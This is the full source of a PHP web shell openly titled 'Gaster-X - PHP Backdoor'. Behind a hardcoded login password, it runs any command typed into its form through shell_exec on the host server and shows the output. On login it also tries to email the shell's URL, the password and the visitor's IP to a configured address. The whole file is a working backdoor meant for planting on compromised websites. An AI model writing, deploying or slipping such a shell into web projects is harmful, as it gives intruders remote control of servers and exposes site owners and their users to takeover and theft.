<?php
$password = "456745";
session_start();

if(isset($_POST['password']) && $_POST['pass']){
    $pass=$_POST['pass'];
 
  if($pass== $password){

    $time_shell = "".date("d/m/Y - H:i:s").""; 
    $ip_remote = $_SERVER["REMOTE_ADDR"]; 
    $from_shellcode = 'shell@'.gethostbyname($_SERVER['SERVER_NAME']).''; 
    $to_email = $email; 
    $server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
    $linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." Password : $password - IP Excuting: $ip_remote - Time: $time_shell"; $header = "From: $from_shellcode\r\n Reply-to: $from_shellcode"; 
    mail($to_email, $server_mail, $linkcr, $header); 

    $_SESSION['password']=$pass;
  }

else {

    $error="Incorrect password";
  }

  }

  if(isset($_GET['logout'])){
    unset($_SESSION['password']);
    header("Location: ?");
  }
?>

<html>
<title>Gaster-X - PHP Backdoor</title>
<link href='https://fonts.googleapis.com/css?family=Oswald' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://cdn.teguh.co/css/hack.css">
</head>

<body>
<div align="center">  
<pre>
   __  __    __ _____ ___ ___       __   __
 / _]/  \ /' _/_   _| __| _ \  __  \ \_/ /
| [/\ /\ |`._`. | | | _|| v / |__|  > , <
       \__/_||_||___/ |_| |___|_|_\      /_/ \_\ V.1.0
</pre>
</div> 

<div class="wrapper">
  <div class="panel panel-default">  

  <h1>PHP BACKDOOR</h1>
  <center><p><?php echo substr(php_uname(),0,120);?></p></center>
  <?php
    session_start();
    if($_SESSION['password']== $password)
{
    if (!empty($_POST['command'])) {
    $command = shell_exec($_POST['command']);
  }
 ?>
  <form  method="post" action="">
    <input type="text" class="command" placeholder="Enter Your Command" name="command" id="command" value="<?= htmlspecialchars($_POST['command']) ?>" required>
    <div>
      <p class="name-help">Enter Your Command</p>
    </div>
    <input type="submit" class="submit" value="Execute Command">  
  </form>
    <?php if ($command): ?>
        <div>
             <div align="center"><h1> Result </h1></div>
        </div><br>
        <textarea rows="10">
<?= htmlspecialchars($command) ?>
        </textarea>
<?php elseif (!$command && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div>
            <center><h1>Output</h1></center>
        </div><br>
        <textarea rows="10">
<?php endif; ?>
        </textarea><br>
        <form method="post" action="" id="logout_form">
        <div align="center"><a href="?logout" id="confirm">LOGOUT</a></div>
 </form>
<?php
}
else
{
?>
<form  method="post" action="">
    <input type="password" class="password" placeholder="Password" name="pass">
    <input type="submit" name="password" class="submit" value="login">
    <div align="center"><br><p><?php echo $error; ?></p></div>
</form>
<?php 
}
?>
</div>
</div>
<div align="center"><p>Made By <a href="https://github.com/Toxic-Omega">Toxic Omega</a></p></div>
</body>


</html>

